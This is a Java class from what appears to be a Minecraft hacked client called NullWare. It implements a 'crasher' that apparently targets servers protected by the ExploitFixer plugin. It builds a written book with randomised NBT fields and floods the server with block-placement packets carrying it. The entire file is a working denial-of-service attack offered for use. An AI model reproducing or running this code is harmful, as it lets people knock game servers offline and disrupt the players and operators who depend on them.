package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import org.apache.commons.lang3.RandomStringUtils;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class ExploitFixer3Crash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    private ItemStack createExploitItem() {
        ItemStack itemStack = new ItemStack(Items.written_book);
        NBTTagCompound compound = new NBTTagCompound();

        NBTTagList pages = new NBTTagList();
        pages.appendTag(new NBTTagString("Exploit payload"));

        compound.setString("author", RandomStringUtils.randomAlphabetic(10));
        compound.setString("title", RandomStringUtils.randomAlphabetic(10));
        compound.setByte("resolved", (byte) 1);
        compound.setTag("pages", pages);

        itemStack.setTagCompound(compound);

        return itemStack;
    }

    @Override
    public void execute(int packets) {
        long start = System.currentTimeMillis();
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(createExploitItem()));
        }
    }
}